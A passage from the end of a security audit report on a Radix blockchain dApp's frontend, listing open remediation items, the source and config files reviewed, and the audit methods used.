- [ ] **LOW-11:** Automate service worker cache versioning
- [ ] **INFO-1:** Add CSP `report-uri` endpoint
- [ ] **INFO-3:** Evaluate `minimal-ui` vs `standalone` for PWA display mode

### Ongoing

- [ ] Monitor `@radixdlt/radix-dapp-toolkit` for security advisories
- [ ] Review and rotate OneSignal and Sentry API keys quarterly
- [ ] Run annual penetration test against the deployed frontend

---

## 10. Files Audited

```
src/App.tsx                          Root component & routing
src/main.tsx                         Entry point (Sentry init, SW registration)
src/vite-env.d.ts                    TypeScript env declarations
src/lib/radix.ts                     Blockchain service & manifest builder
src/lib/radix-config.ts              Network config & XRD helpers
src/lib/radix-lazy.ts                Lazy-loading gateway
src/lib/validation.ts                Input validation schemas (Zod)
src/lib/errorHandling.ts             Error classes, retry logic, circuit breaker
src/lib/rateLimiter.ts               Client-side rate limiting
src/lib/oneSignal.ts                 Push notification service
src/lib/featureFlags.ts              Feature flag evaluation
src/lib/logger.ts                    Logging & Sentry integration
src/contexts/WalletContext.tsx       Wallet state management
src/contexts/GameContext.tsx         Streak & booster logic (localStorage)
src/contexts/OfflineContext.tsx      Offline queue replay logic
src/utils/offlineQueue.ts            IndexedDB offline queue
src/utils/pwa.ts                     PWA install & standalone detection
src/pages/Index.tsx                  Landing page
src/pages/Open.tsx                   Mint flow
src/pages/Reveal.tsx                 Post-mint reveal screen
src/pages/Creator.tsx                Creator dashboard
src/components/ErrorBoundary.tsx     Global error boundary
src/components/BridgeModal.tsx       Cross-chain bridge placeholder
src/components/NotificationDemo.tsx  OneSignal demo UI
src/components/ui/chart.tsx          Recharts wrapper (dangerouslySetInnerHTML)
index.html                           HTML shell & CDN references
public/manifest.json                 PWA manifest
public/sw.js                         Service worker
public/OneSignalSDKWorker.js         OneSignal service worker
public/fonts/font.css                Self-hosted font declarations
public/robots.txt                    Crawler directives
public/.well-known/radix.json        Radix dApp verification
package.json                         Dependencies
package-lock.json                    Locked dependency tree
.github/workflows/ci.yml             CI pipeline
Dockerfile                           Container build
docker-compose.yml                   Local orchestration
nginx.conf                           Production server config
netlify.toml                         Netlify deploy config
vite.config.ts                       Vite build configuration
```

---

*This audit was conducted using manual code review, STRIDE threat modeling, OWASP Top 10 mapping, and built-artifact inspection. No dynamic testing (DAST), fuzzing, or formal verification tools were run — these should be executed before mainnet deployment.*
